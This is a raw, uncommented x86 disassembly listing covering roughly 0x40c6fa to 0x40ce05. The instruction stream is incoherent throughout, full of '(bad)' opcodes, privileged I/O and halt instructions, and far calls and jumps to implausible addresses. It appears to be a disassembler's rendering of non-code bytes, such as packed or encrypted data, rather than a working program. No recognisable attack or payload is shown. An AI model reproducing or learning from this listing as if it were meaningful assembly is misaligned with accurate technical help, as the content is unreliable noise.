  40c6fa:	popf   
  40c6fb:	es repnz popf 
  40c6fe:	adc    DWORD PTR [ecx],0x55
  40c701:	fcmovnbe st,st(3)
  40c703:	lock inc esi
  40c705:	test   DWORD PTR [eax],ebx
  40c707:	inc    edx
  40c708:	cmp    al,0x32
  40c70a:	push   0x181f135d
  40c70f:	mov    bl,0x91
  40c711:	inc    edi
  40c712:	(bad)  
  40c713:	call   0xa7934c99
  40c718:	jae    0x40c724
  40c71a:	les    esp,FWORD PTR [edi+0x46]
  40c71d:	jae    0x40c729
  40c71f:	out    dx,eax
  40c720:	pop    esp
  40c721:	pushf  
  40c722:	out    dx,al
  40c723:	adc    al,0x2b
  40c725:	xchg   ecx,eax
  40c726:	sbb    DWORD PTR [edi],0x25310eaa
  40c72c:	sahf   
  40c72d:	sbb    eax,0xeb17f5e6
  40c732:	iret   
  40c733:	out    dx,eax
  40c734:	(bad)  
  40c736:	mov    bl,0x81
  40c738:	push   ecx
  40c739:	dec    eax
  40c73a:	add    BYTE PTR [ebx+0x7812c620],ah
  40c740:	mov    dl,0xaa
  40c742:	inc    eax
  40c743:	push   ss
  40c744:	shl    bh,0x4e
  40c747:	inc    edx
  40c748:	pop    edx
  40c749:	push   ds
  40c74a:	fidiv  DWORD PTR [edi-0x2fcc92b3]
  40c750:	or     ch,BYTE PTR [esi+esi*4+0x1a]
  40c754:	fbstp  TBYTE PTR [ebx-0x66]
  40c757:	jge    0x40c730
  40c759:	xchg   ebx,eax
  40c75a:	sub    eax,0xd0e9520d
  40c75f:	adc    al,0x6d
  40c761:	jp     0x40c70f
  40c763:	xchg   ecx,eax
  40c764:	mov    WORD PTR [esp+ebx*8],cs
  40c767:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c768:	mov    bh,BYTE PTR [edi]
  40c76a:	retf   0xef64
  40c76d:	shr    BYTE PTR [edi-0x47d1c5fe],0x2d
  40c774:	push   eax
  40c775:	mov    ah,0x65
  40c777:	dec    edx
  40c778:	sub    edx,DWORD PTR [edi-0x55]
  40c77b:	mov    al,ds:0x68fab9b4
  40c780:	lock (bad) 
  40c782:	hlt    
  40c783:	test   eax,0x74485f09
  40c788:	lods   al,BYTE PTR ds:[esi]
  40c789:	ins    BYTE PTR es:[edi],dx
  40c78a:	nop
  40c78b:	pop    es
  40c78c:	cmp    al,0xbb
  40c78e:	in     al,dx
  40c78f:	cmp    eax,0x9aec2fc1
  40c794:	push   eax
  40c795:	scas   eax,DWORD PTR es:[edi]
  40c796:	pop    ss
  40c797:	or     al,0x45
  40c799:	push   es
  40c79a:	or     DWORD PTR [edi-0x3947ee7c],esp
  40c7a0:	xchg   edx,eax
  40c7a1:	push   0xffffffc7
  40c7a3:	je     0x40c7f8
  40c7a5:	call   0xb8e92374
  40c7aa:	inc    ebx
  40c7ab:	jl     0x40c820
  40c7ad:	dec    ebp
  40c7ae:	in     al,0x50
  40c7b0:	retf   
  40c7b1:	mov    ?,WORD PTR fs:[edx-0xa]
  40c7b5:	cmp    al,dl
  40c7b7:	jg     0x40c754
  40c7b9:	xchg   ecx,eax
  40c7ba:	inc    edx
  40c7bb:	xchg   ebx,eax
  40c7bc:	fcom   DWORD PTR [edx+0x5]
  40c7bf:	xchg   ecx,eax
  40c7c0:	add    al,0x6
  40c7c2:	in     al,dx
  40c7c3:	sbb    al,0x3a
  40c7c5:	sub    dl,BYTE PTR [ebp-0x7eaf647e]
  40c7cb:	adc    ebx,DWORD PTR [edi-0x2]
  40c7ce:	dec    edx
  40c7cf:	push   edi
  40c7d0:	aam    0xbe
  40c7d2:	xor    BYTE PTR [eax-0xb],0x58
  40c7d6:	enter  0xde53,0x22
  40c7da:	stos   BYTE PTR es:[edi],al
  40c7db:	es bnd jns 0x40c7b8
  40c7df:	ins    BYTE PTR es:[edi],dx
  40c7e0:	pop    eax
  40c7e1:	imul   ecx,DWORD PTR [edi],0x4f3b0a7e
  40c7e7:	sar    BYTE PTR [ebp-0x67c45fe8],1
  40c7ed:	mov    cl,0x60
  40c7ef:	inc    ecx
  40c7f0:	out    dx,eax
  40c7f1:	sub    DWORD PTR [ecx-0x55],esp
  40c7f4:	inc    edi
  40c7f5:	scas   eax,DWORD PTR es:[edi]
  40c7f6:	adc    al,0x34
  40c7f8:	dec    eax
  40c7f9:	pushf  
  40c7fa:	pop    ecx
  40c7fb:	inc    ecx
  40c7fc:	ror    DWORD PTR [eax-0x3c],0x1
  40c800:	push   ebp
  40c801:	jp     0x40c807
  40c803:	cmp    eax,0x1d0e29c4
  40c808:	int    0xee
  40c80a:	or     esp,ebp
  40c80c:	mov    esp,DWORD PTR [edx+0x69]
  40c80f:	mov    ebp,0x6f5790fa
  40c814:	gs push cs
  40c816:	cmp    edx,ecx
  40c818:	in     al,0x27
  40c81a:	inc    edx
  40c81b:	clc    
  40c81c:	add    al,0x7
  40c81f:	push   edi
  40c820:	lock std 
  40c822:	inc    edx
  40c823:	add    ch,ch
  40c825:	repnz inc ecx
  40c827:	cmp    al,BYTE PTR [ebp+eax*4-0x5d]
  40c82b:	loope  0x40c7b0
  40c82d:	mov    esi,0x1f84c7dc
  40c832:	mov    ebp,0x4cfc1fa6
  40c837:	out    0x88,eax
  40c839:	push   cs
  40c83a:	(bad)  [edi-0x15c55f1d]
  40c840:	sub    al,0x76
  40c842:	dec    edi
  40c843:	pop    esi
  40c844:	mov    DWORD PTR [esi+edi*8-0x77],ebx
  40c848:	sbb    ebx,esi
  40c84a:	(bad)  
  40c84b:	stos   DWORD PTR es:[edi],eax
  40c84c:	(bad)  
  40c84d:	push   ds
  40c84e:	mov    dh,0xa1
  40c850:	push   es
  40c851:	not    edi
  40c853:	(bad)  
  40c854:	ss stos BYTE PTR es:[edi],al
  40c856:	mov    bl,0x50
  40c858:	mov    ah,0x74
  40c85a:	mov    bh,0x31
  40c85c:	aad    0x6c
  40c85e:	pusha  
  40c85f:	mov    eax,ds:0xee97507a
  40c864:	xor    al,0xc6
  40c866:	fwait
  40c867:	pop    edx
  40c868:	pop    edi
  40c869:	fs push edi
  40c86b:	shl    DWORD PTR [ebp+0x4b],0xb3
  40c86f:	cmp    eax,0x7492e54d
  40c874:	je     0x40c827
  40c876:	sahf   
  40c877:	fistp  QWORD PTR [ebx]
  40c879:	xchg   esp,eax
  40c87a:	jg     0x40c8dd
  40c87c:	nop
  40c87d:	(bad)
  40c881:	fwait
  40c882:	leave  
  40c883:	and    BYTE PTR [ebx],ch
  40c885:	adc    eax,0xd19efb63
  40c88a:	mov    eax,0x9bfdff6d
  40c88f:	xor    al,0x4e
  40c891:	call   0x9f89b958
  40c896:	pop    ebx
  40c897:	or     esp,DWORD PTR [edx]
  40c899:	jo     0x40c86c
  40c89b:	bound  edx,QWORD PTR [ebx+0x2d]
  40c89e:	jbe    0x40c835
  40c8a0:	cs adc al,0xac
  40c8a3:	or     al,0xae
  40c8a5:	ja     0x40c8c2
  40c8a7:	or     DWORD PTR [ecx],0xffffffa7
  40c8aa:	mov    bl,0x1
  40c8ac:	pop    eax
  40c8ad:	and    al,0x6a
  40c8af:	or     dh,dl
  40c8b1:	cmp    eax,0x6c731edc
  40c8b6:	sti    
  40c8b7:	sub    eax,0x728d082e
  40c8bc:	jne    0x40c903
  40c8be:	add    al,BYTE PTR [ecx+0x2c818134]
  40c8c4:	stos   DWORD PTR es:[edi],eax
  40c8c5:	dec    ebx
  40c8c6:	rol    DWORD PTR [esi],cl
  40c8c8:	scas   eax,DWORD PTR es:[edi]
  40c8c9:	jle    0x40c878
  40c8cb:	mov    cs,WORD PTR [edi-0x8]
  40c8ce:	pop    ds
  40c8cf:	mov    bh,ch
  40c8d1:	(bad)  [eax-0x5fa31594]
  40c8d7:	pop    ecx
  40c8d8:	out    dx,eax
  40c8d9:	xor    dh,BYTE PTR [edi+ecx*1-0x28]
  40c8dd:	mov    al,0xc8
  40c8df:	xchg   esp,eax
  40c8e0:	inc    edx
  40c8e1:	std    
  40c8e2:	xchg   DWORD PTR es:[ebp+eiz*1+0x462686dc],ecx
  40c8ea:	and    DWORD PTR [edx-0x4a],edi
  40c8ed:	outs   dx,BYTE PTR ds:[esi]
  40c8ee:	repnz xlat BYTE PTR ds:[ebx]
  40c8f0:	jno    0x40c8f6
  40c8f2:	jmp    0xb2ab1cd5
  40c8f7:	imul   eax,DWORD PTR [ebx],0x44
  40c8fa:	dec    edx
  40c8fb:	sar    DWORD PTR [ecx+0x2c9b2b39],0xbc
  40c902:	inc    ebx
  40c903:	and    bl,BYTE PTR [ebp-0x4e]
  40c906:	dec    esi
  40c907:	test   al,0x67
  40c909:	jp     0x40c906
  40c90b:	pushw  es
  40c90d:	adc    eax,0x9b6cffef
  40c912:	ds sbb dh,dh
  40c915:	ja     0x40c96c
  40c917:	sahf   
  40c918:	dec    edx
  40c919:	push   0xffffff8a
  40c91b:	sbb    DWORD PTR [eax-0x36],esi
  40c91e:	fdiv   DWORD PTR [ecx+0x29cf0f27]
  40c924:	xchg   dl,dh
  40c926:	bound  esp,QWORD PTR [ebx]
  40c928:	fcom   DWORD PTR [ecx]
  40c92a:	nop
  40c92b:	push   cs
  40c92c:	inc    ebp
  40c92d:	fisttp DWORD PTR [edi]
  40c92f:	or     cl,ch
  40c931:	mov    cl,0x9d
  40c934:	cld    
  40c935:	push   ss
  40c936:	dec    edx
  40c937:	das    
  40c938:	push   ebp
  40c939:	inc    esp
  40c93a:	push   ebx
  40c93b:	add    BYTE PTR [edx],0x6f
  40c93e:	das    
  40c93f:	cmp    ebp,DWORD PTR [eax]
  40c941:	in     eax,0xf
  40c943:	jne    0x40c8d9
  40c945:	iret   
  40c946:	into   
  40c947:	xor    eax,0xdd7ee386
  40c94c:	loop   0x40c94f
  40c94e:	and    DWORD PTR [edi],esi
  40c950:	dec    eax
  40c951:	rcl    BYTE PTR [ebp+0x54df55c6],cl
  40c957:	sub    DWORD PTR [ebx+edx*1-0x4e],esi
  40c95b:	retf   0x8ddc
  40c95e:	pop    ebp
  40c95f:	fs mov ecx,0x1f9694d0
  40c965:	or     al,BYTE PTR gs:[esi+0x548906a3]
  40c96c:	aad    0xbf
  40c96e:	imul   dl
  40c970:	mov    ch,0xdb
  40c972:	les    edi,FWORD PTR [edx]
  40c974:	aaa    
  40c975:	lock (bad) 
  40c977:	aaa    
  40c978:	xchg   BYTE PTR [ecx+0x46],bh
  40c97b:	inc    ebp
  40c97c:	(bad)  
  40c97d:	and    BYTE PTR [edi],ah
  40c97f:	and    eax,0x90bf84ae
  40c984:	je     0x40c9c7
  40c986:	mov    esp,0xc596586a
  40c98b:	fidiv  WORD PTR [eax]
  40c98d:	and    edx,0xe6df9301
  40c993:	inc    ebp
  40c994:	mov    edx,DWORD PTR [edi+0x1941ad0f]
  40c99a:	int    0xd6
  40c99c:	lods   al,BYTE PTR ss:[esi]
  40c99e:	es push esi
  40c9a0:	mov    WORD PTR [edx],gs
  40c9a2:	into   
  40c9a3:	retf   0x9b82
  40c9a6:	inc    esi
  40c9a7:	(bad)  
  40c9a8:	jmp    0x40ca16
  40c9aa:	(bad)
  40c9ad:	idiv   BYTE PTR [edi+0x726042ce]
  40c9b3:	sbb    DWORD PTR [edx-0x38],edx
  40c9b6:	sub    BYTE PTR [edx+ecx*2-0x31],cl
  40c9ba:	xchg   BYTE PTR [edi],ah
  40c9bc:	pop    edi
  40c9bd:	pop    esi
  40c9be:	fsubr  DWORD PTR [eax+0x4c]
  40c9c1:	jb     0x40ca31
  40c9c3:	(bad)  
  40c9c4:	retf   
  40c9c5:	jl     0x40ca1e
  40c9c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9c8:	or     DWORD PTR [ebx],esp
  40c9ca:	retf   
  40c9cb:	jb     0x40c97c
  40c9cd:	outs   dx,BYTE PTR ds:[esi]
  40c9ce:	cmp    eax,DWORD PTR [edx+0x78]
  40c9d1:	push   edx
  40c9d2:	pop    esi
  40c9d3:	ins    BYTE PTR es:[edi],dx
  40c9d4:	call   FWORD PTR [ecx-0x570e319]
  40c9da:	push   eax
  40c9db:	xchg   edx,eax
  40c9dc:	ficom  WORD PTR [esi]
  40c9de:	xchg   ebp,eax
  40c9df:	mov    dh,0x90
  40c9e1:	lock dec eax
  40c9e3:	jmp    0xfff672e3
  40c9e8:	cmovne ebx,eax
  40c9eb:	dec    eax
  40c9ec:	enter  0x34d3,0x62
  40c9f0:	std    
  40c9f1:	and    eax,0x97561ea5
  40c9f6:	pusha  
  40c9f7:	cmp    al,0xfe
  40c9f9:	jo     0x40ca3f
  40c9fb:	adc    eax,0x2e95ad73
  40ca00:	inc    ebp
  40ca01:	aas    
  40ca02:	je     0x40ca83
  40ca04:	sbb    DWORD PTR [ebx],ecx
  40ca06:	and    DWORD PTR [ecx+0x11],edx
  40ca09:	adc    BYTE PTR [edi+0x70af2ecb],ah
  40ca0f:	jg     0x40ca36
  40ca11:	cmp    eax,0x469988e0
  40ca16:	je     0x40c9d1
  40ca18:	mov    esp,0x45776d7b
  40ca1d:	xchg   ebx,eax
  40ca1e:	pop    esp
  40ca1f:	xchg   ebp,eax
  40ca20:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca21:	ret    
  40ca22:	add    DWORD PTR [esi-0x35],esi
  40ca25:	fwait
  40ca26:	or     DWORD PTR [edx+0xc],ebp
  40ca29:	push   es
  40ca2a:	fadd   QWORD PTR ds:0x2b2c212d
  40ca30:	xchg   edi,eax
  40ca31:	aaa    
  40ca32:	add    eax,0xd3ac7a46
  40ca37:	xor    esp,DWORD PTR [edi+0x3334e0a9]
  40ca3d:	jle    0x40ca4a
  40ca3f:	sub    edx,DWORD PTR [ebx]
  40ca41:	ins    BYTE PTR es:[edi],dx
  40ca42:	mov    ah,0x74
  40ca44:	jp     0x40ca6c
  40ca46:	into   
  40ca47:	mov    ds:0xeaa54d6,eax
  40ca4c:	sbb    eax,0xcceee52
  40ca51:	imul   ebp,DWORD PTR [esi-0x1e],0x644ec34f
  40ca58:	gs pusha 
  40ca5a:	retf   
  40ca5b:	stos   DWORD PTR es:[edi],eax
  40ca5c:	push   eax
  40ca5d:	xchg   esp,eax
  40ca5e:	retf   
  40ca5f:	arpl   WORD PTR [edx],bx
  40ca61:	outs   dx,DWORD PTR ds:[esi]
  40ca62:	mov    al,ds:0xd2d1b144
  40ca67:	xchg   DWORD PTR [edi],esi
  40ca69:	add    BYTE PTR ds:0x67d07fdb,ch
  40ca6f:	jecxz  0x40cadf
  40ca71:	inc    edi
  40ca72:	cmp    dl,bl
  40ca74:	pop    esi
  40ca75:	pop    ds
  40ca76:	(bad)  
  40ca77:	fadd   QWORD PTR [edx]
  40ca79:	xor    al,0x31
  40ca7b:	ins    BYTE PTR es:[edi],dx
  40ca7c:	mov    edi,0x4b024df6
  40ca81:	push   ebx
  40ca82:	test   al,0x63
  40ca84:	ret    0x50ee
  40ca87:	rcl    DWORD PTR [ecx-0x7f],0xc5
  40ca8b:	sbb    dh,BYTE PTR [edx-0x6d835e51]
  40ca91:	sbb    BYTE PTR [edx+edx*2-0x12],cl
  40ca95:	mov    dh,0x1c
  40ca97:	fs push ebp
  40ca99:	ja     0x40caf8
  40ca9b:	jle    0x40ca25
  40ca9d:	rol    edi,1
  40ca9f:	dec    esi
  40caa0:	mov    ecx,0xb18f4d89
  40caa5:	nop
  40caa6:	jl     0x40cb1a
  40caa8:	adc    bl,BYTE PTR [eax+0x1]
  40caab:	pushf  
  40caac:	mov    bl,0xd2
  40caae:	repnz int3 
  40cab0:	daa    
  40cab1:	inc    edi
  40cab2:	dec    esi
  40cab3:	addr16 in eax,dx
  40cab5:	ins    DWORD PTR es:[edi],dx
  40cab6:	push   es
  40cab7:	into   
  40cab8:	cwde   
  40cab9:	add    ebp,DWORD PTR [edx-0x25]
  40cabc:	dec    esi
  40cabd:	adc    al,0xc3
  40cabf:	ja     0x40ca8c
  40cac1:	jg     0x40cb27
  40cac3:	xchg   edi,eax
  40cac4:	(bad)  
  40cac5:	cld    
  40cac6:	push   cs
  40cac7:	mov    eax,ebx
  40cac9:	adc    eax,0x8fb54c7
  40cace:	lods   al,BYTE PTR ds:[esi]
  40cacf:	jno    0x40ca83
  40cad1:	sbb    dh,ah
  40cad3:	jae    0x40ca5e
  40cad5:	jg     0x40cabe
  40cad7:	dec    esi
  40cad8:	(bad)  
  40cad9:	xchg   ebp,eax
  40cada:	or     eax,DWORD PTR [edx]
  40cadc:	xor    ebx,DWORD PTR [esi+0x6a7ad3a4]
  40cae2:	dec    ecx
  40cae3:	aaa    
  40cae4:	cmc    
  40cae5:	inc    ecx
  40cae6:	add    al,0x6f
  40cae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cae9:	push   0x54
  40caeb:	adc    DWORD PTR [ebp-0x2a],0x69034c1b
  40caf2:	mov    ecx,DWORD PTR ds:0x5725ace0
  40caf8:	scas   al,BYTE PTR es:[edi]
  40caf9:	imul   ebx,DWORD PTR [ebp-0x384f888c],0xaa190b0d
  40cb03:	shr    esi,cl
  40cb05:	inc    esp
  40cb06:	mov    ds:0x8d91469b,eax
  40cb0b:	mov    eax,0xab1e74d4
  40cb10:	push   0xffffff9d
  40cb12:	cmp    BYTE PTR [edx],al
  40cb14:	sar    ecx,1
  40cb16:	lock push 0xad4d97ed
  40cb1c:	addr16 pop edx
  40cb1e:	icebp  
  40cb1f:	jae    0x40cb65
  40cb21:	imul   ebx,DWORD PTR fs:[esi],0x7edfa6db
  40cb28:	popf   
  40cb29:	(bad)  
  40cb2a:	or     bh,BYTE PTR [ecx+0x3a]
  40cb2d:	cli    
  40cb2e:	in     eax,dx
  40cb2f:	call   0x95e993e3
  40cb34:	outs   dx,DWORD PTR ds:[esi]
  40cb35:	sbb    al,0xbf
  40cb37:	xor    DWORD PTR [ebx+0x2fc60f50],edi
  40cb3d:	fcom   st(7)
  40cb3f:	inc    eax
  40cb40:	pop    edx
  40cb41:	or     DWORD PTR [esi],ebx
  40cb43:	fs jmp 0x40cb53
  40cb46:	jmp    0x5f1e:0x7fd46163
  40cb4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb4e:	les    esi,FWORD PTR [eax+eax*2+0x23668548]
  40cb55:	mov    al,0xce
  40cb57:	popf   
  40cb58:	and    eax,0xedca5763
  40cb5d:	push   ds
  40cb5e:	mov    al,0xd1
  40cb60:	sbb    edi,DWORD PTR [esi-0x5c7f470]
  40cb66:	inc    ebx
  40cb67:	aad    0x2c
  40cb69:	into   
  40cb6a:	(bad)
  40cb6e:	sub    esi,DWORD PTR [eax]
  40cb70:	faddp  st(0),st
  40cb72:	ja     0x40cb3b
  40cb74:	out    0x1b,eax
  40cb76:	adc    BYTE PTR [ecx],bl
  40cb78:	push   ds
  40cb79:	aad    0xc5
  40cb7b:	mov    edi,0x75c70335
  40cb80:	push   ebp
  40cb81:	mov    bh,0x36
  40cb83:	ret    
  40cb84:	loop   0x40cb9b
  40cb86:	push   0x5
  40cb88:	fstp   DWORD PTR [edx]
  40cb8a:	leave  
  40cb8b:	inc    ebx
  40cb8c:	enter  0x6331,0x2e
  40cb90:	test   DWORD PTR [ebx],edi
  40cb92:	sub    ebp,DWORD PTR ds:0xabe8c25f
  40cb98:	mov    ah,0x9a
  40cb9a:	push   0x5
  40cb9c:	mov    ah,0x78
  40cb9e:	mov    dh,0xae
  40cba0:	xchg   esi,eax
  40cba1:	mov    DWORD PTR [ecx+0x3f78f04e],edx
  40cba7:	int3   
  40cba8:	xchg   ebp,eax
  40cba9:	dec    ecx
  40cbaa:	out    0xbe,al
  40cbac:	nop
  40cbad:	in     al,0xd9
  40cbaf:	dec    esp
  40cbb0:	ret    
  40cbb1:	push   DWORD PTR [eax+0x38]
  40cbb4:	add    BYTE PTR [ebx-0x36269fb],al
  40cbba:	jo     0x40cc33
  40cbbc:	mov    ch,0x1
  40cbbe:	je     0x40cc1a
  40cbc0:	lods   eax,DWORD PTR ds:[esi]
  40cbc1:	and    al,0x63
  40cbc3:	loopne 0x40cc0f
  40cbc5:	sbb    ch,bh
  40cbc7:	dec    esp
  40cbc8:	sub    ch,al
  40cbca:	xchg   edi,eax
  40cbcb:	push   ecx
  40cbcc:	shl    dh,1
  40cbce:	xor    BYTE PTR [edx-0x39c8da2f],ah
  40cbd4:	mov    DWORD PTR [edi],ebp
  40cbd6:	push   ebp
  40cbd7:	icebp  
  40cbd8:	push   ebx
  40cbd9:	jnp    0x40cb67
  40cbdb:	(bad)  
  40cbdc:	enter  0xc624,0xad
  40cbe0:	push   esp
  40cbe1:	dec    esi
  40cbe2:	not    dl
  40cbe4:	and    al,ah
  40cbe6:	mov    dh,0x57
  40cbe8:	test   eax,0xe8d3aa16
  40cbed:	mov    ds:0xfc6aa4e,al
  40cbf2:	shl    DWORD PTR [ecx-0x28d592f],0x62
  40cbf9:	dec    BYTE PTR [edx]
  40cbfb:	out    0xb9,al
  40cbfd:	neg    BYTE PTR [ebp+0x6f]
  40cc00:	mov    edx,DWORD PTR [esi+ebp*4-0x57]
  40cc04:	rcl    DWORD PTR [esi],cl
  40cc06:	retf   
  40cc07:	ss pop ss
  40cc09:	jecxz  0x40cc10
  40cc0b:	in     al,0xe1
  40cc0d:	retf   
  40cc0e:	stc    
  40cc0f:	inc    esi
  40cc10:	pop    ebp
  40cc11:	sbb    DWORD PTR [esi+0x12],0xd321a81a
  40cc18:	outs   dx,DWORD PTR ds:[esi]
  40cc19:	sar    BYTE PTR [eax],0xef
  40cc1c:	into   
  40cc1d:	cdq    
  40cc1e:	cs pop esi
  40cc20:	or     BYTE PTR [ecx],0xcd
  40cc23:	jmp    0x40cc24
  40cc25:	inc    eax
  40cc26:	jecxz  0x40cbb6
  40cc28:	lods   eax,DWORD PTR ds:[esi]
  40cc29:	mov    eax,ds:0x849d3cad
  40cc2e:	loopne 0x40cc29
  40cc30:	cmc    
  40cc31:	das    
  40cc32:	(bad)  [eax-0x6d]
  40cc35:	dec    eax
  40cc36:	push   ecx
  40cc37:	jecxz  0x40cbdc
  40cc39:	mov    edi,0xce8cfd81
  40cc3e:	xor    BYTE PTR [ebp+ecx*1-0x530b5905],al
  40cc45:	leave  
  40cc46:	fucom  st(1)
  40cc48:	push   esi
  40cc49:	adc    ch,BYTE PTR [edx+0x6f]
  40cc4c:	cdq    
  40cc4d:	nop
  40cc4e:	das    
  40cc4f:	push   edx
  40cc50:	pop    ecx
  40cc51:	dec    ebp
  40cc52:	sbb    BYTE PTR [eax],cl
  40cc54:	jge    0x40ccbe
  40cc56:	cmp    DWORD PTR [ecx],edx
  40cc58:	fdivr  QWORD PTR [eax-0x6a568916]
  40cc5e:	dec    edi
  40cc5f:	retf   0xae02
  40cc62:	nop
  40cc63:	jnp    0x40cc25
  40cc65:	cmp    DWORD PTR [ebx-0x14],esi
  40cc68:	call   0x2242:0xd64a1db3
  40cc6f:	std    
  40cc70:	pop    edx
  40cc71:	pushf  
  40cc72:	jle    0x40ccbc
  40cc74:	pop    es
  40cc75:	mov    DWORD PTR [eax],0xc71874c9
  40cc7b:	add    BYTE PTR [eax-0x1bd7cda1],0xd
  40cc82:	cmp    edx,ebx
  40cc84:	push   ecx
  40cc85:	outs   dx,DWORD PTR es:[esi]
  40cc87:	adc    ebp,DWORD PTR [ebx+0x66f9b22c]
  40cc8d:	jg     0x40ccd1
  40cc8f:	sub    BYTE PTR [ebx+0x35],bh
  40cc92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cc93:	scas   al,BYTE PTR es:[edi]
  40cc94:	ret    0x9bbf
  40cc97:	mov    ecx,0x7b57797d
  40cc9c:	stos   DWORD PTR es:[edi],eax
  40cc9d:	mov    dl,0x92
  40cc9f:	je     0x40cc2c
  40cca1:	lahf   
  40cca2:	and    ah,0xe4
  40cca5:	dec    esp
  40cca6:	pop    ss
  40cca7:	cmc    
  40cca8:	jbe    0x40cc4d
  40ccaa:	jnp    0x40cd19
  40ccac:	cli    
  40ccad:	arpl   WORD PTR [ebx+0x4a],di
  40ccb0:	or     eax,DWORD PTR [ebx+ebp*4]
  40ccb3:	dec    ebx
  40ccb4:	mov    edx,0x2e17498d
  40ccb9:	mov    ds:0x6639f908,al
  40ccbe:	sbb    ch,ah
  40ccc0:	call   0x198d:0xa0d9f5a7
  40ccc7:	xor    ebp,ecx
  40ccc9:	inc    esp
  40ccca:	add    BYTE PTR gs:[edx],ch
  40cccd:	xor    ebx,DWORD PTR [esi-0x276a9d32]
  40ccd3:	sbb    DWORD PTR [eax],edx
  40ccd5:	in     eax,dx
  40ccd6:	mov    edi,0xdc5ad6a4
  40ccdb:	ret    
  40ccdc:	aam    0xc8
  40ccde:	imul   BYTE PTR [ebx-0x544cc717]
  40cce4:	test   BYTE PTR [edx+0x541d1263],0x4
  40cceb:	jmp    0xb42f5c49
  40ccf0:	mov    ch,0xdf
  40ccf2:	mov    ecx,0xfff28eaa
  40ccf7:	pop    ss
  40ccf8:	or     cl,0xbe
  40ccfb:	jge    0x40ccf5
  40ccfd:	shl    edi,cl
  40ccff:	mov    al,0x74
  40cd01:	or     DWORD PTR [eax+edx*1],ecx
  40cd04:	push   edi
  40cd05:	jne    0x40cd31
  40cd07:	jnp    0x40cd1d
  40cd09:	fsubr  st,st(6)
  40cd0b:	mov    bh,0x5c
  40cd0d:	das    
  40cd0e:	leave  
  40cd0f:	popa   
  40cd10:	in     eax,dx
  40cd11:	push   cs
  40cd12:	mov    ds:0x5e0473d5,al
  40cd17:	outs   dx,BYTE PTR ds:[esi]
  40cd18:	cwde   
  40cd19:	xchg   edx,eax
  40cd1a:	stos   BYTE PTR es:[edi],al
  40cd1b:	fiadd  WORD PTR [edi]
  40cd1d:	pop    esp
  40cd1e:	das    
  40cd1f:	outs   dx,DWORD PTR ds:[esi]
  40cd20:	jp     0x40cda1
  40cd22:	jns    0x40ccf0
  40cd24:	leave  
  40cd25:	push   0x63acf14
  40cd2a:	in     al,dx
  40cd2b:	fist   WORD PTR ds:0x263f94a0
  40cd31:	mov    cl,cl
  40cd33:	inc    eax
  40cd34:	inc    ebx
  40cd35:	mov    bl,0x5f
  40cd37:	int    0x14
  40cd39:	fmul   QWORD PTR [eax+0x2bdf861b]
  40cd3f:	imul   eax,esp,0x71
  40cd42:	fistp  QWORD PTR [ebx-0x3d]
  40cd45:	scas   eax,DWORD PTR es:[edi]
  40cd46:	aas    
  40cd47:	hlt    
  40cd48:	scas   eax,DWORD PTR es:[edi]
  40cd49:	jge    0x40ccd1
  40cd4b:	mov    esi,0x2d38db04
  40cd50:	hlt    
  40cd51:	pop    ecx
  40cd52:	(bad)  
  40cd53:	adc    DWORD PTR [eax+ebx*1],edi
  40cd56:	aam    0x2b
  40cd58:	iret   
  40cd59:	dec    edi
  40cd5a:	mov    esp,0x320e0b3
  40cd5f:	or     ch,BYTE PTR ds:0xaf1a1aa4
  40cd65:	inc    edx
  40cd66:	ins    BYTE PTR es:[edi],dx
  40cd67:	lods   eax,DWORD PTR ds:[esi]
  40cd68:	sub    DWORD PTR [edx],eax
  40cd6a:	sbb    dl,bh
  40cd6c:	retf   0xa0d2
  40cd6f:	mov    bl,0xa8
  40cd71:	ret    
  40cd72:	jbe    0x40cdd8
  40cd74:	xchg   DWORD PTR [esp+0x22],ebx
  40cd78:	adc    al,0x6d
  40cd7a:	adc    DWORD PTR [ebp+0x1c],ebp
  40cd7d:	test   DWORD PTR [ecx-0x8],esi
  40cd80:	stc    
  40cd81:	jns    0x40cdf9
  40cd83:	dec    esp
  40cd84:	and    ecx,edi
  40cd86:	(bad)  
  40cd87:	cli    
  40cd88:	lahf   
  40cd89:	leave  
  40cd8a:	nop
  40cd8b:	popf   
  40cd8c:	xchg   BYTE PTR [edx+0x6d],ah
  40cd8f:	cmc    
  40cd90:	enter  0xa5ac,0x9c
  40cd94:	call   0xb8c4:0x25567a8c
  40cd9b:	xor    DWORD PTR [ebx],esi
  40cd9d:	ret    
  40cd9e:	mov    esp,0xbf676907
  40cda3:	add    esp,esp
  40cda5:	fstp   QWORD PTR [ebx]
  40cda7:	cmp    al,0xae
  40cda9:	imul   eax,DWORD PTR [esi],0x59a372e9
  40cdaf:	test   bl,bh
  40cdb1:	dec    ebx
  40cdb2:	inc    esp
  40cdb3:	push   ecx
  40cdb4:	sti    
  40cdb5:	adc    ebx,DWORD PTR [ebp+0x74]
  40cdb8:	cwde   
  40cdb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cdba:	jge    0x40cd85
  40cdbc:	lock fistp QWORD PTR [edi+edx*8-0x3e]
  40cdc1:	lock mov ch,0xe6
  40cdc4:	mov    eax,0xa69438a0
  40cdc9:	aad    0x50
  40cdcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cdcc:	or     eax,0x9648cfae
  40cdd1:	xor    al,BYTE PTR [eax+0x5ac7c696]
  40cdd7:	xchg   DWORD PTR [esi],eax
  40cdd9:	xchg   ebx,eax
  40cdda:	(bad)  
  40cddb:	xor    al,0x93
  40cddd:	in     al,dx
  40cdde:	arpl   WORD PTR [edx+0xa],si
  40cde1:	adc    al,0x70
  40cde3:	xchg   DWORD PTR [ecx+0x17a68deb],ebp
  40cde9:	jg     0x40ce16
  40cdeb:	ret    0x4fce
  40cdee:	inc    esp
  40cdef:	aam    0x7
  40cdf1:	imul   esp,DWORD PTR [esi],0x14
  40cdf4:	adc    BYTE PTR [edi+0x73],cl
  40cdf7:	mov    dl,0x52
  40cdf9:	adc    DWORD PTR [ecx+0x383a0c4d],ebp
  40cdff:	popf   
  40ce00:	bound  edx,QWORD PTR [ebx]
  40ce02:	ins    BYTE PTR es:[edi],dx
  40ce03:	xor    cl,ch
  40ce05:	and    al,BYTE PTR [eax+edx*8]
